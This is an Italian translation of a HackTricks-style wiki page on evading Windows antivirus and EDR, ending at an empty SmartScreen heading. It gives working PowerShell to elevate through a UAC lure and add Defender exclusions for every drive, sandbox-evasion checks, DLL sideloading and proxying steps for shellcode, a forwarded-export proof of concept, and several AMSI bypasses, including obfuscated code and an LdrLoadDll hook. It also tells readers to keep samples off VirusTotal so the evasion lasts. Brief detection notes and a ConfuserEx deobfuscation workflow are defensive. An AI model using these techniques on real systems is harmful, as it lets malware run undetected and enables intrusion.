# Bypass dell'Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta inizialmente da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Arrestare Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per impedire il funzionamento di Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per impedire il funzionamento di Windows Defender simulando la presenza di un altro AV.
- [Disabilitare Defender se si dispone dei privilegi di amministratore](basic-powershell-for-pentesters/README.md)

### Esca UAC in stile installer prima di manomettere Defender

I loader pubblici che si spacciano per game cheat vengono spesso distribuiti come installer Node.js/Nexe non firmati, che prima **chiedono all'utente l'elevazione dei privilegi** e solo successivamente neutralizzano Defender. Il flusso è semplice:

1. Verificare la presenza di un contesto amministrativo con `net session`. Il comando ha successo solo quando il chiamante dispone dei privilegi di amministratore, quindi un errore indica che il loader è in esecuzione come utente standard.
2. Riavviare immediatamente se stesso con il verbo `RunAs` per attivare il previsto prompt di consenso UAC preservando la riga di comando originale.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Le vittime credono già di installare software “crackato”, quindi il prompt viene solitamente accettato, concedendo al malware i diritti necessari per modificare la policy di Defender.

### Esclusioni `MpPreference` indiscriminate per ogni lettera di unità

Una volta ottenuti i privilegi elevati, le catene in stile GachiLoader massimizzano i punti ciechi di Defender invece di disabilitare direttamente il servizio. Il loader termina prima il watchdog della GUI (`taskkill /F /IM SecHealthUI.exe`), quindi imposta **esclusioni estremamente ampie**, rendendo non analizzabili ogni profilo utente, directory di sistema e disco rimovibile:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Osservazioni principali:

- Il loop percorre ogni filesystem montato (D:\, E:\, chiavette USB, ecc.), quindi **qualsiasi payload futuro depositato ovunque sul disco viene ignorato**.
- L'esclusione dell'estensione `.sys` è preventiva: gli attaccanti si riservano l'opzione di caricare in seguito driver non firmati senza dover modificare nuovamente Defender.
- Tutte le modifiche vengono applicate in `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, consentendo agli stage successivi di verificare che le esclusioni persistano o di ampliarle senza riattivare UAC.

Poiché nessun servizio di Defender viene arrestato, i controlli superficiali dello stato continuano a segnalare “antivirus attivo”, anche se l'ispezione in tempo reale non analizza mai quei percorsi.

## **AV Evasion Methodology**

Attualmente, gli AV utilizzano metodi diversi per verificare se un file è malevolo o meno: rilevamento statico, analisi dinamica e, per gli EDR più avanzati, analisi comportamentale.

### **Rilevamento statico**

Il rilevamento statico si ottiene individuando stringhe malevole note o array di byte all'interno di un binario o di uno script, ed estraendo anche informazioni dal file stesso (ad esempio descrizione del file, nome dell'azienda, firme digitali, icona, checksum, ecc.). Questo significa che l'utilizzo di tool pubblici noti può farti rilevare più facilmente, poiché probabilmente sono già stati analizzati e classificati come malevoli. Esistono alcuni modi per aggirare questo tipo di rilevamento:

- **Crittografia**

Se crittografi il binario, l'AV non avrà modo di rilevare il tuo programma, ma avrai bisogno di una qualche forma di loader per decrittografare ed eseguire il programma in memoria.

- **Offuscamento**

A volte è sufficiente modificare alcune stringhe nel binario o nello script per superare i controlli dell'AV, ma può essere un'attività dispendiosa in termini di tempo, a seconda di ciò che stai cercando di offuscare.

- **Tooling personalizzato**

Se sviluppi i tuoi tool, non esisteranno signature malevole note, ma ciò richiede molto tempo e impegno.

> [!TIP]
> Un buon metodo per verificare il rilevamento statico di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). In pratica, divide il file in più segmenti e chiede a Defender di analizzarli singolarmente; in questo modo può indicarti esattamente quali stringhe o byte sono stati segnalati nel tuo binario.

Ti consiglio vivamente di dare un'occhiata a questa [playlist di YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sull'AV Evasion pratica.

### **Analisi dinamica**

L'analisi dinamica si verifica quando l'AV esegue il tuo binario in una sandbox e osserva eventuali attività malevole (ad esempio tentare di decrittografare e leggere le password del browser, eseguire un minidump su LSASS, ecc.). Questa parte può essere un po' più complessa, ma ecco alcune cose che puoi fare per eludere le sandbox.

- **Attendere prima dell'esecuzione** A seconda di come viene implementato, può essere un ottimo modo per aggirare l'analisi dinamica dell'AV. Gli AV hanno pochissimo tempo per analizzare i file senza interrompere il flusso di lavoro dell'utente, quindi utilizzare attese prolungate può ostacolare l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare l'attesa, a seconda di come è stata implementata.
- **Controllare le risorse della macchina** Di solito le sandbox dispongono di risorse molto limitate (ad esempio < 2GB di RAM), altrimenti potrebbero rallentare la macchina dell'utente. Puoi anche essere molto creativo in questo caso, ad esempio controllando la temperatura della CPU o persino la velocità delle ventole: non tutto sarà implementato nella sandbox.
- **Controlli specifici della macchina** Se vuoi colpire un utente la cui workstation è collegata al dominio "contoso.local", puoi verificare il dominio del computer per vedere se corrisponde a quello specificato; in caso contrario, puoi far terminare il programma.

È emerso che il computername della Sandbox di Microsoft Defender è HAL9TH; quindi puoi verificare il nome del computer nel tuo malware prima della detonation. Se il nome corrisponde a HAL9TH, significa che ti trovi nella sandbox di Defender e puoi far terminare il programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli di [@mgeeky](https://twitter.com/mariuszbit) per contrastare le sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p>canale #malware-dev del <a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a></p></figcaption></figure>

Come abbiamo già detto in questo post, i **tool pubblici** prima o poi **verranno rilevati**, quindi dovresti porti una domanda:

Ad esempio, se vuoi eseguire il dump di LSASS, **hai davvero bisogno di usare mimikatz**? Oppure potresti usare un progetto diverso, meno conosciuto, che esegue anch'esso il dump di LSASS.

La risposta corretta è probabilmente la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei malware più segnalati dagli AV e dagli EDR, se non il più segnalato. Sebbene il progetto in sé sia davvero valido, è anche un incubo da utilizzare per aggirare gli AV; quindi cerca semplicemente delle alternative per ottenere ciò che ti serve.

> [!TIP]
> Quando modifichi i tuoi payload per l'evasion, assicurati di **disattivare l'invio automatico dei sample** in Defender e, per favore, sul serio, **NON CARICARLI SU VIRUSTOTAL** se il tuo obiettivo è ottenere l'evasion nel lungo periodo. Se vuoi verificare se il tuo payload viene rilevato da un determinato AV, installalo su una VM, prova a disattivare l'invio automatico dei sample e testalo lì finché non sei soddisfatto del risultato.

## EXEs vs DLLs

Quando possibile, **dai sempre priorità all'utilizzo delle DLL per l'evasion**; secondo la mia esperienza, i file DLL vengono solitamente **rilevati e analizzati molto meno**, quindi in alcuni casi si tratta di un trucco molto semplice per evitare il rilevamento (se naturalmente il tuo payload può essere eseguito come DLL).

Come possiamo vedere in questa immagine, un DLL Payload di Havoc ha un detection rate di 4/26 su antiscan.me, mentre il payload EXE ha un detection rate di 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>confronto su antiscan.me tra un normale payload EXE di Havoc e una normale DLL di Havoc</p></figcaption></figure>

Ora mostreremo alcuni trucchi che puoi usare con i file DLL per essere molto più stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL utilizzato dal loader, posizionando l'applicazione vittima e i payload malevoli affiancati.

Puoi verificare quali programmi sono suscettibili al DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e il seguente script PowerShell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando produrrà l'elenco dei programmi suscettibili a DLL hijacking all'interno di "C:\Program Files\\" e dei file DLL che tentano di caricare.

Ti consiglio vivamente di **esplorare personalmente i programmi DLL Hijackable/Sideloadable**; se eseguita correttamente, questa tecnica è piuttosto stealth, ma se utilizzi programmi DLL Sideloadable noti pubblicamente, potresti essere scoperto facilmente.

Il semplice posizionamento di una DLL malevola con il nome che un programma si aspetta di caricare non consentirà di caricare il tuo payload, poiché il programma si aspetta alcune funzioni specifiche all'interno di quella DLL. Per risolvere questo problema, utilizzeremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate effettuate da un programma dalla DLL proxy (e malevola) alla DLL originale, preservando così le funzionalità del programma e consentendo di gestire l'esecuzione del tuo payload.

Utilizzerò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci fornirà 2 file: un template del codice sorgente di una DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (encoded con [SGN](https://github.com/EgeBalci/sgn)) sia la proxy DLL hanno un tasso di rilevamento di 0/26 su [antiscan.me](https://antiscan.me)! Direi che è un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ti consiglio **vivamente** di guardare il [VOD su Twitch di S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sul DLL Sideloading e anche il [video di ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) per saperne di più su ciò che abbiamo discusso in modo più approfondito.

### Abuso degli export inoltrati (ForwardSideLoading)

I moduli PE di Windows possono esportare funzioni che sono in realtà dei "forwarder": invece di puntare al codice, la voce dell'export contiene una stringa ASCII nella forma `TargetDll.TargetFunc`. Quando un caller risolve l'export, il loader di Windows:

- Carica `TargetDll` se non è già stato caricato
- Risolve `TargetFunc` da esso

Comportamenti chiave da comprendere:
- Se `TargetDll` è una KnownDLL, viene fornita dal namespace KnownDLLs protetto (ad esempio ntdll, kernelbase, ole32).
- Se `TargetDll` non è una KnownDLL, viene usato il normale ordine di ricerca delle DLL, che include la directory del modulo che sta eseguendo la risoluzione del forward.

Questo abilita una primitive di sideloading indiretta: trovare una DLL firmata che esporta una funzione inoltrata a un nome di modulo non-KnownDLL, quindi collocare quella DLL firmata insieme a una DLL controllata dall'attaccante denominata esattamente come il modulo target inoltrato. Quando viene invocato l'export inoltrato, il loader risolve il forward e carica la tua DLL dalla stessa directory, eseguendo la sua DllMain.

Esempio osservato su Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` non è una KnownDLL, quindi viene individuata tramite il normale ordine di ricerca.

PoC (copia e incolla):
1) Copia la DLL di sistema firmata in una cartella scrivibile
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Inserisci una `NCRYPTPROV.dll` malevola nella stessa cartella. È sufficiente un `DllMain` minimale per ottenere l'esecuzione del codice; non è necessario implementare la funzione inoltrata per attivare `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Attiva il forward con un LOLBin firmato:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento osservato:
- rundll32 (firmato) carica il `keyiso.dll` side-by-side (firmato)
- Durante la risoluzione di `KeyIsoSetAuditingInterface`, il loader segue il forward verso `NCRYPTPROV.SetAuditingInterface`
- Il loader carica `NCRYPTPROV.dll` da `C:\test` ed esegue il suo `DllMain`
- Se `SetAuditingInterface` non è implementata, riceverai un errore "missing API" solo dopo che `DllMain` è già stato eseguito

Suggerimenti per la ricerca:
- Concentrati sugli export forwarded in cui il modulo di destinazione non è una KnownDLL. Le KnownDLL sono elencate in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puoi enumerare gli export forwarded con strumenti come:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta l'inventario dei forwarder di Windows 11 per cercare candidati: https://hexacorn.com/d/apis_fwd.txt

Idee per il rilevamento e la difesa:
- Monitora i LOLBins (ad esempio `rundll32.exe`) che caricano DLL firmate da percorsi non di sistema, seguiti dal caricamento di DLL non-KnownDLLs con lo stesso nome di base da quella directory
- Genera un alert per catene di processi/moduli come: `rundll32.exe` → `keyiso.dll` non di sistema → `NCRYPTPROV.dll` all'interno di percorsi scrivibili dall'utente
- Applica policy di code integrity (WDAC/AppLocker) e nega i permessi di scrittura+esecuzione nelle directory delle applicazioni

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze è un payload toolkit per bypassare gli EDR usando processi sospesi, direct syscalls e metodi di esecuzione alternativi`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo stealth.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'Evasion è solo un gioco del gatto e del topo: ciò che funziona oggi potrebbe essere rilevato domani, quindi non fare mai affidamento su un solo strumento; se possibile, prova a concatenare più tecniche di evasion.

## Direct/Indirect Syscalls & Risoluzione SSN (SysWhispers4)

Gli EDR spesso inseriscono **user-mode inline hooks** negli stub delle syscall di `ntdll.dll`. Per bypassare questi hook, puoi generare stub di syscall **diretti** o **indiretti** che caricano l'SSN (System Service Number) corretto ed effettuano la transizione alla kernel mode senza eseguire l'entrypoint dell'export sottoposto a hook.

**Opzioni di invocazione:**
- **Direct (embedded)**: inserisce un'istruzione `syscall`/`sysenter`/`SVC #0` nello stub generato (nessun accesso all'export di `ntdll`).
- **Indirect**: esegue un jump verso un gadget `syscall` esistente all'interno di `ntdll`, in modo che la transizione al kernel sembri provenire da `ntdll` (utile per l'evasion euristica); **randomized indirect** seleziona un gadget da un pool a ogni chiamata.
- **Egg-hunt**: evita di incorporare nel disco la sequenza statica di opcode `0F 05`; risolve una sequenza syscall a runtime.

**Strategie di risoluzione SSN resistenti agli hook:**
- **FreshyCalls (VA sort)**: deduce gli SSN ordinando gli stub delle syscall in base all'indirizzo virtuale invece di leggere i byte dello stub.
- **SyscallsFromDisk**: mappa una `\KnownDlls\ntdll.dll` pulita, legge gli SSN dalla sua sezione `.text`, quindi esegue l'unmap (bypassa tutti gli hook in memoria).
- **RecycledGate**: combina la deduzione degli SSN tramite ordinamento VA con la validazione degli opcode quando uno stub è pulito; ricorre alla deduzione tramite VA se lo stub è sottoposto a hook.
- **HW Breakpoint**: imposta DR0 sull'istruzione `syscall` e utilizza un VEH per acquisire l'SSN da `EAX` a runtime, senza analizzare i byte sottoposti a hook.

Esempio di utilizzo di SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per prevenire il "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado di analizzare solo i **file presenti sul disco**, quindi, se si riusciva in qualche modo a eseguire i payload **direttamente in memoria**, l'AV non poteva fare nulla per impedirlo, poiché non aveva una visibilità sufficiente.

La funzionalità AMSI è integrata nei seguenti componenti di Windows.

- User Account Control, o UAC (elevazione di EXE, COM, MSI o installazione di ActiveX)
- PowerShell (script, utilizzo interattivo e valutazione dinamica del codice)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macro VBA di Office

Consente alle soluzioni antivirus di analizzare il comportamento degli script, esponendone il contenuto in una forma non cifrata e non offuscata.

L'esecuzione di `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produrrà il seguente alert in Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Si noti come anteponga `amsi:` e poi il percorso dell'eseguibile da cui è stato eseguito lo script, in questo caso powershell.exe

Non abbiamo scritto alcun file sul disco, ma siamo comunque stati rilevati in memoria a causa di AMSI.

Inoltre, a partire da **.NET 4.8**, anche il codice C# viene eseguito attraverso AMSI. Questo riguarda persino `Assembly.Load(byte[])`, utilizzato per caricare un'esecuzione in memoria. Per questo motivo, per l'esecuzione in memoria è consigliato utilizzare versioni inferiori di .NET (come la 4.7.2 o precedenti) se si vuole eludere AMSI.

Esistono un paio di modi per aggirare AMSI:

- **Obfuscation**

Poiché AMSI funziona principalmente tramite rilevamenti statici, modificare gli script che si tenta di caricare può essere un buon modo per eludere il rilevamento.

Tuttavia, AMSI è in grado di deoffuscare gli script anche se presentano più livelli, quindi l'obfuscation potrebbe essere una cattiva opzione, a seconda di come viene eseguita. Questo rende l'elusione tutt'altro che semplice. A volte, però, è sufficiente modificare un paio di nomi di variabili per ottenere il risultato desiderato, quindi dipende da quanto qualcosa è stato segnalato.

- **AMSI Bypass**

Poiché AMSI viene implementato caricando una DLL nel processo di powershell (e anche in cscript.exe, wscript.exe, ecc.), è possibile manometterlo facilmente anche eseguendo il codice come utente non privilegiato. A causa di questa vulnerabilità nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per eludere la scansione di AMSI.

**Forcing an Error**

Forzare il fallimento dell'inizializzazione di AMSI (amsiInitFailed) farà sì che non venga avviata alcuna scansione per il processo corrente. Questo metodo è stato divulgato inizialmente da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per impedirne un utilizzo più ampio.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
È bastata una riga di codice powershell per rendere AMSI inutilizzabile per il processo powershell corrente. Naturalmente, questa riga è stata rilevata da AMSI stessa, quindi è necessaria qualche modifica per utilizzare questa tecnica.

Ecco un bypass di AMSI modificato, tratto da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Questa tecnica è stata scoperta inizialmente da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nel trovare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile della scansione dell'input fornito dall'utente) e sovrascriverlo con istruzioni che restituiscano il codice per E_INVALIDARG; in questo modo, il risultato della scansione effettiva sarà 0, che viene interpretato come un risultato pulito.

> [!TIP]
> Leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) per una spiegazione più dettagliata.

Esistono anche molte altre tecniche utilizzate per bypassare AMSI con powershell; consulta [**questa pagina**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**questo repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) per saperne di più.

### Blocco di AMSI impedendo il caricamento di amsi.dll (hook di LdrLoadDll)

AMSI viene inizializzato solo dopo che `amsi.dll` è stato caricato nel processo corrente. Un bypass robusto e indipendente dal linguaggio consiste nell'applicare un hook user-mode su `ntdll!LdrLoadDll` che restituisca un errore quando il modulo richiesto è `amsi.dll`. Di conseguenza, AMSI non viene mai caricato e per quel processo non viene eseguita alcuna scansione.

Schema dell'implementazione (pseudocodice x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Note
- Funziona con PowerShell, WScript/CScript e custom loader allo stesso modo (qualsiasi elemento che altrimenti caricherebbe AMSI).
- Da abbinare all'invio degli script tramite stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) per evitare artefatti estesi nella riga di comando.
- È stato osservato l'uso da parte di loader eseguiti tramite LOLBins (ad esempio, `regsvr32` che richiama `DllRegisterServer`).

Lo strumento **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genera anch'esso script per bypassare AMSI.
Lo strumento **[https://amsibypass.com/](https://amsibypass.com/)** genera anch'esso script per bypassare AMSI, evitando le signature tramite funzioni definite dall'utente randomizzate, variabili randomizzate ed espressioni di caratteri, oltre ad applicare una randomizzazione del casing dei caratteri alle keyword di PowerShell per evitare le signature.

**Rimuovere la signature rilevata**

Puoi usare uno strumento come **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** per rimuovere la signature AMSI rilevata dalla memoria del processo corrente. Questo strumento funziona scansionando la memoria del processo corrente alla ricerca della signature AMSI e sovrascrivendola quindi con istruzioni NOP, rimuovendola di fatto dalla memoria.

**Prodotti AV/EDR che usano AMSI**

Puoi trovare un elenco dei prodotti AV/EDR che usano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usare PowerShell versione 2**
Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza che vengano analizzati da AMSI. Puoi fare così:
```bash
powershell.exe -version 2
```
## PS Logging

Il logging di PowerShell è una funzionalità che consente di registrare tutti i comandi PowerShell eseguiti su un sistema. Questo può essere utile per finalità di auditing e troubleshooting, ma può anche rappresentare un **problema per gli attaccanti che vogliono eludere il rilevamento**.

Per bypassare il logging di PowerShell, puoi usare le seguenti tecniche:

- **Disabilitare la trascrizione e il logging dei moduli di PowerShell**: puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) a questo scopo.
- **Usare la versione 2 di Powershell**: se usi Powershell versione 2, AMSI non verrà caricato, quindi potrai eseguire gli script senza che vengano analizzati da AMSI. Puoi farlo con: `powershell.exe -version 2`
- **Usare una sessione Powershell unmanaged**: usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per avviare una powershell senza difese (è ciò che usa `powerpick` di Cobal[t] Strike).


## Offuscamento

> [!TIP]
> Diverse tecniche di offuscamento si basano sulla cifratura dei dati, aumentando l'entropia del binario e rendendo più semplice per gli AV e gli EDR rilevarlo. Fai attenzione e valuta di applicare la cifratura solo a sezioni specifiche del codice che contengono dati sensibili o che devono essere nascoste.

### Deoffuscare binari .NET protetti da ConfuserEx

Quando si analizza malware che usa ConfuserEx 2 (o fork commerciali), è comune incontrare diversi livelli di protezione che bloccano decompilatori e sandbox. Il workflow seguente **ripristina un IL quasi originale**, che può poi essere decompilato in C# con strumenti come dnSpy o ILSpy.

1. Rimozione dell'anti-tampering – ConfuserEx cifra ogni *corpo di metodo* e lo decifra all'interno del costruttore statico del *modulo* (`<Module>.cctor`). Inoltre modifica il checksum PE, quindi qualsiasi modifica causerà il crash del binario. Usa **AntiTamperKiller** per individuare le tabelle dei metadati cifrate, recuperare le chiavi XOR e riscrivere un assembly pulito:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`), che possono essere utili per creare un tuo unpacker.

2. Recupero dei simboli / del control-flow – passa il file *pulito* a **de4dot-cex** (un fork di de4dot compatibile con ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flag:
• `-p crx` – seleziona il profilo ConfuserEx 2
• de4dot annullerà il control-flow flattening, ripristinerà namespace, classi e nomi delle variabili originali e decifrerà le stringhe costanti.

3. Rimozione delle proxy-call – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (le cosiddette *proxy-call*) per ostacolare ulteriormente la decompilazione. Rimuovile con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Dopo questo passaggio dovresti osservare normali API .NET come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4. Pulizia manuale – esegui il binario risultante con dnSpy, cerca grandi blob Base64 o l'uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per individuare il payload *reale*. Spesso il malware lo memorizza come un array di byte codificato in TLV, inizializzato all'interno di `<Module>.byte_0`.

La catena descritta ripristina il flusso di esecuzione **senza dover eseguire il sample malevolo**, risultando utile quando si lavora su una workstation offline.

> 🛈  ConfuserEx produce un attributo custom chiamato `ConfusedByAttribute`, che può essere usato come IOC per effettuare automaticamente il triage dei sample.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: offuscatore C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): l'obiettivo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di offrire una maggiore sicurezza del software tramite [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e protezione contro le manomissioni.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come utilizzare il linguaggio `C++11/14` per generare, durante la compilazione, codice offuscato senza usare strumenti esterni e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): aggiunge un livello di operazioni offuscate generate dal framework di metaprogrammazione dei template C++, rendendo la vita un po' più difficile a chi vuole crackare l'applicazione.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un offuscatore di binari x64 in grado di offuscare diversi pe file, tra cui: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di codice metamorfico per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di offuscamento del codice a grana fine per linguaggi supportati da LLVM che utilizza ROP (return-oriented programming). ROPfuscator offusca un programma a livello di codice assembly trasformando le istruzioni normali in catene ROP, contrastando la nostra concezione naturale del normale flusso di controllo.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un Crypter PE .NET scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e quindi caricarli

## SmartScreen & MoTW

